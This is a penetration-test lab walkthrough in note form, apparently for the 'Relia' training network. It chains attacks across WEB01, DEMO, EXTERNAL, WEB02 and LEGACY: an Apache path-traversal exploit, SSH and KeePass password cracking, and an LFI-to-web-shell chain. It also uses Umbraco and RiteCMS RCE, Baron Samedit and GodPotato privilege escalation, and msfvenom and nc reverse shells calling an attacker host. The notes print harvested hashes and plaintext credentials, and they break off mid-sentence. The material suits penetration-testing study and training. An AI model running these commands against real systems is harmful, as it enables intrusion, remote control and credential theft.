# Questions
We are tasked with a penetration test of Relia, an industrial company building driving systems for the timber industry. The target got attacked a few weeks ago and wants now to get an assessment of their IT security. Their goal is to determine if an attacker can breach the perimeter and get access to the domain controller in the internal network.

# Scan the DMZ network
sudo nmap -sC -sV -T4 192.168.162.245-250 192.168.162.189,191
[port-scanning.md]

# Found some interesting port from .245 where it have 2222 running and 21
ssh root@192.168.162.245 -p 2222  
root@192.168.162.245: Permission denied (publickey).
# It required public key, lets try to access FTP port with anonymous user
ftp -p 203.0.113.0
# When prompted for a username, you can enter either “ftp” or “anonymous”. Both are same

# Unfortunately anonymous access FTP is not valid
# Lets focus on the web server, based on the port scanning results, we can see the Apache HTTP server is using 2.4.49
searchsploit apache 2.4.49
searchsploit -m 50383.sh  

# Run the exploitation
code targets.txt
bash 50383.sh targets.txt /etc/passwd
# Here we get some users lets update to user file
[user.txt]

# We can try to check on each user .ssh path 
# Common private key filename can refer to below 
id_rsa：RSA私钥文件。
id_dsa：DSA私钥文件（较少使用）。
id_ecdsa：ECDSA私钥文件（使用椭圆曲线加密算法）。
id_ed25519：Ed25519私钥文件（使用EdDSA算法）。
id_xmss：XMSS私钥文件（使用Hash-based签名算法）。

# Then we found anita user have id_edcsa
sudo bash 50383.sh targets.txt /home/anita/.ssh/id_ecdsa

# Then we found the privatekey require passphrase
ssh -i id_edcsa anita@192.168.162.245 -p 2222
Enter passphrase for key 'id_edcsa': 

# Use ssh2john to extract the hash
ssh2john id_edcsa > ssh.hash

hashcat -h | grep -i "ssh" 
...
22921 | RSA/DSA/EC/OpenSSH Private Keys ($6$)                      | Private Key
...
# Hashcat seem unable to crack we can try with JohntheRipper
john ssh.hash --wordlist=/usr/share/wordlists/rockyou.txt 
...
fireball         (id_edcsa) 
...

# SSH it with the password cracked again
cat local.txt

# Create stable listener
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.165 LPORT=8888 -f elf > cute.elf  
msfconsole
use multi/handler
set payload linux/x64/shell_reverse_tcp
set LHOST tun0
set LPORT 8888
set ExitonSession false
run -j
curl http://192.168.45.165:8088/Relia/cute.elf --output cute.elf
chmod 755 cute.elf
./cute.elf

# Upload the linpeas
sessions -i 1 -t 100
python3 -c 'import pty; pty.spawn("/bin/bash")'

curl http://192.168.45.165:8088/Linux/linpeas.sh --output linpeas.sh
chmod 755 linpeas.sh
anita@web01:/home/anita$ bash linpeas.sh
...
[+] [CVE-2021-3156] sudo Baron Samedit
[+] [CVE-2021-3156] sudo Baron Samedit 2
...

# Based on the linpeas results, it is suggested to use CVE-2021-3156 to exploit, We download the source code file from
# Reference https://github.com/worawit/CVE-2021-3156
anita@web01:/home/anita$ curl http://192.168.45.165:8088/Relia/WEB01/exploit_nss.py -o exp_nss.py
anita@web01:/home/anita$ python3 exp_nss.py
# Successful!
whoami
root
cd /root
cat proof.txt
2c3af8035e3c106f68501b857085372a
# Go to /tmp run the cute.elf again to establish a Full Interactive TTY
sessions -i 2 -t 100
python3 -c 'import pty; pty.spawn("/bin/bash")'

cd /home/anita
./linpeas
...
miranda:$6$01GOUNyvP1lFg0Id$QoFsKEsD4um4ctVU62MU/KEmQbdj0OSw7gJ6EXVA4YTjTNxvfzQxdhdsyjHUaw4qO0YAwEMoXUXWBdCd3zW4V.:19277:0:99999:7:::             
steven:$6$Rj4tu27TLjcnwC2v$wsNuqImPdduB9mXZHpjjEROvTKwWsp2SckcMB.AtcvHyS7tHTCGh.CrUCP0ogsFH9IjG3i2qekcAXRlkmeZOT1:19277:0:99999:7:::               
mark:$6$blWxRVRno5YcdGiN$6ekTTBXDvGfaFRSPxZVLhR8tAmFd20RLlXNL5Q8U44gp0Heq7MLmFZrlaHeaX.pFhlJ3lif10E1zsO3W2tdbC/:19277:0:99999:7:::                 
anita:$6$Fq6VqZ4n0zxZ9Jh8$4gcSpNrlib60CDuGIHpPZVT0g/CeVDV0jR3fkOC7zIEaWEsnkcQfKp8YVCaZdGFvaEsHCuYHbALFn49meC.Rj1:19277:0:99999:7:::   
offsec:$6$p6n32TS.3/wDw7ax$TNwiUYnzlmx7Q0w59MbhSRjqW37W20OpGs/fCRJ3XiffbBVQuZTwtGeIJglRJg0F0vFKNBT39a57gakRJ2zPw/:19277:0:99999:7:::              
$6$p6n32TS.3/wDw7ax$TNwiUYnzlmx7Q0w59MbhSRjqW37W20OpGs/fCRJ3XiffbBVQuZTwtGeI
...

# DEMO
# Use the same SSH methods like WEB01 on the DEMO
ssh -o StrictHostKeyChecking=no -i anita-id_ecdsa anita@192.168.162.246 -p2222
python3 -c 'import pty; pty.spawn("/bin/bash")'
anita@demo:/tmp$ hostname
demo
anita@demo:$ cat local.txt
# Curl linpeas and chmod 755
...
[+] [CVE-2021-3156] sudo Baron Samedit
[+] [CVE-2021-3156] sudo Baron Samedit 2
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
...

# Upload the same exploit script from WEB01
python3 exp_nss.py
# Unfortunately failed... then probably this machine is not follow to previous methods.
# We notice that 8000 port is running locally on DEMO, and I think I would like to reverse proxy into my localhost and check
ssh -o StrictHostKeyChecking=no -N -i anita-id_ecdsa anita@192.168.162.246 -p2222 -L 8000:localhost:8000
# Access to the http://localhost:8000, nothing much the website can tell.
# We can further dig into the file that we had captured from the linpeas which is /var/www/html folder.
# Then I found a /var/www/internal/backend folder, when access through 127.0.0.1:8000/backend it looks like a web console, but unable to signin cause we dont have any user information. 
# Lookthrough the source code of the backend folder index.php
```
<?php 
$which_view=$_GET['view'];
if(isset($which_view)) {
    include("views/" . $which_view);
} else {
    header('Location: /backend/?view=user.inc');
}
?>
```
# It seems like LFI vulnerability is exist
# We can test the LFI on the webserver, lets try the same vulnerability LFI from WEB01.
http://127.0.0.1:8000/backend/?view=../../../../../../../../etc/passwd
# From the /var/crash/ folder we did found the test.php, where I think it can be abused to run the cmd code
var/crash$ cat test.php
<?php echo passthru($_GET["cmd"]); ?>
# Lets try, yes it do return www-data 
http://127.0.0.1:8000/backend/?view=../../../../../../../../var/crash/test.php&cmd=whoami
http://127.0.0.1:8000/backend/?view=../../../../../../../../var/crash/test.php&cmd=sudo -l
...
Matching Defaults entries for www-data on demo: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty User www-data may run the following commands on demo: (ALL) NOPASSWD: ALL 
...
# It can execute SUDO without password
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.165 LPORT=6666 -f elf -o cute.elf
chmod 777 cute.elf
rlwrap nc -lvnp 6666
# Use this website for urlencoder
https://www.urlencoder.io/
cmd=sudo%20chmod%20777%20cute.elf
cmd=sudo%20.%2Fcute.elf
python3 -c 'import pty; pty.spawn("/bin/bash")'
root@demo:/root# cat proof.txt
cp /etc/shadow .
cp /etc/passwd .
scp -P 2222 -i anita-id_ecdsa anita@192.168.162.246:/home/anita/passwd .
scp -P 2222 -i anita-id_ecdsa anita@192.168.162.246:/home/anita/shadow .
unshadow passwd shadow > unshadowed.txt
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt

# EXTERNAL
sudo smbmap --host-file iplists.txt -u john
...
[+] IP: 192.168.162.248:445     Name: 192.168.162.248           Status: Authenticated
transfer                                                READ, WRITE
Users                                                   READ ONLY
...
# Lets try to access the share folder
smbclient //192.168.162.248/Users -U john
# From the \Public\Libraries we found a config file "RecordedTV.library-ms" which is a shell file. Take a note first, lets dig further.
# Command looking is too slow, lets mount the SMB folder to local
mount -t cifs //192.168.162.248/transfer /home/kali/Desktop/RELIA/EXTERNAL/transfer 
...
DB-back(1)/NewFolder/Emma/Documents/Database.kdbx
logs/build/materials/assets/Databases/Database.kdbx # Cannot use
logs/build/materials/assets/Databases/Database (2).kdbx # Cannot use
r14_2022/build/DNN/wwwroot/web.config
...
[web.config]
```
<!-- Connection String for SQL Server 2008/2012 Express -->
<add name="SiteSqlServer" connectionString="Data Source=.\SQLExpress;Initial Catalog=dnndatabase;User ID=dnnuser;Password=DotNetNukeDatabasePassword!" providerName="System.Data.SqlClient" />
```
# Thats all for now, lets follow to the previous password cracking methods to brute force the Database.kdbx we found
keepass2john Database.kdbx > keepass.hash
cat keepass.hash
# remove database prefix
code keepass.hash 
# make sure the prefix is removed
cat keepass.hash 
hashcat --help | grep -i "KeePass"
...
13400 | KeePass 1 (AES/Twofish) and KeePass 2 (AES)         | Password Manager
...
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule
...
welcome1       
Status...........: Cracked
...
# Need to download keepassXC to open the database file
https://keepassxc.org/
sudo apt-get install keepassxc
# Opened the keepass database, we have few username and password
[dmz-creds.md] and update to [user.txt] & [pass.txt]
# From the port scanning, we knew that RDP port is enable, lets try to find the password access to the Windows
xfreerdp /u:emma /p:SomersetVinyl1! /v:192.168.162.248 +clipboard /cert-ignore
PS C:\Users\emma\Desktop> cat local.txt
# Upload winpeas and run [emma-winpeas.md]
...
    AppKey: !8@aBRBYdb3!
    PS history file: C:\Users\emma\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
    (Administrator) BetaTask: C:\BetaMonitor\BetaMonitor.exe
    Trigger: At system startup-After triggered, repeat every 00:01:00 for a duration of 1.00:00:00.
...
# Here we get a Appkey, PS history file and taskscheduler with administrator running every 1 minute.
# I would like to check the BetaMonitor emma permissions
PS C:\BetaMonitor> icacls .
. BUILTIN\Users:(OI)(CI)(RX)
  NT AUTHORITY\SYSTEM:(OI)(CI)(F)
  BUILTIN\Administrators:(OI)(CI)(F)
  CREATOR OWNER:(OI)(CI)(IO)(F)
# Emma user couldn't write, but there is a interesting file BetaMonitor.log is exist, and it shows 
...
[2022-10-20_05:28:12.2019] Coudln't find BetaLibrary.Dll.
...
# We can create a BetaLibrary.Dll file and place it somewhere we can let it perform privilege escalations
# Lets create a dll file 
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.45.165  LPORT=8888 -f dll -o msf.dll
# We cannot upload the dll payload to any SYSTEM ENV PATH.. Stuck for a while.. and remember that we found a APPKEY from WinPEAS. Where I think we can try it for mark user
xfreerdp /u:mark /p:'!8@aBRBYdb3!' /v:192.168.162.248 /cert-ignore +drive:/home/kali/Desktop,/smb
# :) Fuck
PS C:\Users\mark\Desktop> type proof.txt
# We have the mark user a.k.a Administrator, thats good for now. We may proceed to WEB02 machine.

# WEB02
# Access to the Websites found nothing, then we can try there is a crackmapexec smb and rdp brute force with the current username and password we have.
crackmapexec smb iplist.txt -u user.txt -p pass.txt --continue-on-success
crowbar -b rdp -s 192.168.162.247/32 -U user.txt -C pass.txt
# None of them are found :D, lets try with nmap for full scanning again.
nmap -sV -T4 -p- 192.168.162.247
# After a full scan I found a FTP port in 14020, lets try to check is it possible to have any more information
...
14020/tcp open  ftp     FileZilla ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-r--r--r-- 1 ftp ftp         237639 Nov 04  2022 umbraco.pdf
|_ftp-bounce: bounce working!
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
...
# Anonymous FTP login allowed, lets check that umbraco.pdf
ftp 192.168.162.247 -p 14020
username: anonymous
password: anonymous
ftp> get umbraco.pdf
# Open the pdf and one line do capture our attention
...
You can use the user account "mark" (@relia.com) for basic configuration of the Umbraco
instances on IIS servers (pass "OathDeeplyReprieve91").
IIS is configured to only allow access to Umbraco using the server FQDN at the moment.
o e.g. web02.relia.com, not just web02.
...
# Here saying Umbraco only allow to be access through FQDN instead of IP. Thats means we need to define the DNS
sudo nano /etc/hosts
...
192.168.162.247 web02.relia.com
...
# Now we can access through FQDN and login with the user account found
http://web02.relia.com:14080/
mark@relia.com:OathDeeplyReprieve91
# We can view the Umbraco version is 7.12.4
searchsploit umbraco 
...
Umbraco CMS 7.12.4 - (Authenticated) Remote Code Execution                        | aspx/webapps/46153.py
Umbraco CMS 7.12.4 - Remote Code Execution (Authenticated)                        | aspx/webapps/49488.py
...
# Lets try with these exploit
searchsploit -m 46153
# Some modification are required on the code
...
login = "mark@relia.com";
password="OathDeeplyReprieve91";
host = "web02.relia.com:14080";
...
# Looks like this script unable to work... lets try another one
searchsploit -m 49488
# Then found a better exploit script from Github
https://github.com/Jonoans/Umbraco-RCE
python3 exploit.py -u mark@relia.com -p OathDeeplyReprieve91 -w http://web02.relia.com:14080 -i 192.168.45.165
# Unable to get interactive shell, lets create a payload and try
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.165 LPORT=8888 -f exe -o met.exe
PS C:\inetpub\temp> iwr -uri http://192.168.45.165:8088/RELIA/met.exe -Outfile met.exe
# Go to metasploit
whoami /priv
...
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
...
# Lets try to upload PrintSpoofer
PS C:\users\public\Downloads> .\printspoof.exe -c "cmd -c C:\users\public\Downloads\met.exe"
# Operation failed, lets try GodPotato
PS C:\users\public\Downloads> iwr -uri http://192.168.45.165:8088/Windows/Priv-Esc/GodPotato-NET4.exe -Outfile godpotato.exe
PS C:\users\public\Downloads> .\godpotato.exe -cmd "C:\users\public\Downloads\met.exe"
[*] Command shell session 2 opened (192.168.45.165:8888 -> 192.168.162.247:49904) at 2024-06-01 23:02:23 +0800
msf6 exploit(multi/handler) > sessions -i 2 -t 100
C:\users\public\Downloads>whoami
nt authority\system
PS C:\> cat local.txt
PS C:\Users\Administrator\Desktop> type proof.txt

# LEGACY
nmap -A -T4 -p- 192.168.162.249 
gobuster dir -u http://192.168.162.249:8000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
# Not much value information, lets try dirb
dirb http://192.168.162.249:8000
...
+ http://192.168.162.249:8000/cms/admin.php (CODE:200|SIZE:1117)     
...
# We tried admin:admin and it access lel.
Searchsploit RiteCMS
...
RiteCMS 3.1.0 - Remote Code Execution (RCE) (Authenticated)                       | php/webapps/50616.txt
...
searchsploit -m 50616
# Follow to the PoC method 2, we can use burpsuite to change intercept file upload by changing its extensions to bypass restrictions. 
http://192.168.162.249:8000/cms/media/pw0ny-shell.pHp
adrian@LEGACY:C:\Users\adrian\Desktop# type local.txt
# Change the shell by upload met.exe and upload winpeas
[adrian-winpeas.md]
...
C:\Users\adrian\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
...

type ..\ConsoleHost_history.txt
...
echo "Let's check if this script works running as damon and password i6yuT6tym@"
echo "Don't forget to clear history once done to remove the password!"
Enter-PSSession -ComputerName LEGACY -Credential $credshutdown /s
...
# We obtain the damon password
C:\Users\Public\Downloads>net user damon
# Damon is a local administrator. Lets run the shell as damon. I upload RunasCS.exe 
.\run.exe 'damon' 'i6yuT6tym@' 'C:\Users\Public\Downloads\nc.exe 192.168.45.165 6667 -e powershell.exe'
PS C:\Users\damon\Desktop> type proof.txt
# Lets explore more what can we get from this machine
PS C:\staging\.git\logs> cat HEAD
...
0000000000000000000000000000000000000000 967fa71c359fffcbeb7e2b72b27a321612e3ad11 damian <damian> 1666256797 -0700 commit (initial): V1
...
# damian user get
git show
...
commit 8b430c17c16e6c0515e49c4eafdd129f719fde74
Author: damian <damian>
Date:   Thu Oct 20 02:07:42 2022 -0700

    Email config not required anymore

diff --git a/htdocs/cms/data/email.conf.bak b/htdocs/cms/data/email.conf.bak
deleted file mode 100644
index 77e370c..0000000
--- a/htdocs/cms/data/email.conf.bak
+++ /dev/null
@@ -1,5 +0,0 @@
-Email configuration of the CMS
-maildmz@relia.com:DPuBT9tGCBrTbR
-
-If something breaks contact jim@relia.com as he is responsible for the mail server. 
-Please don't send any office or executable attachments as they get filtered out for security reasons.
\ No newline at end of file
...
# Get the maildmz@relia and jim@relia.com
# I think thats far I can go with the staging folder.. Lets try the mimikatz.. Unfortunately damon permisison does not enough to capture from memory, lets access to NT/AUTHORITY using godpotato
PS C:\users\public\Downloads> .\godpotato.exe -cmd "C:\users\public\Downloads\met.exe"

# Based on above email we know that is something breaks we can contact jim@relia.com as he is the mail server admin. We can follow to our 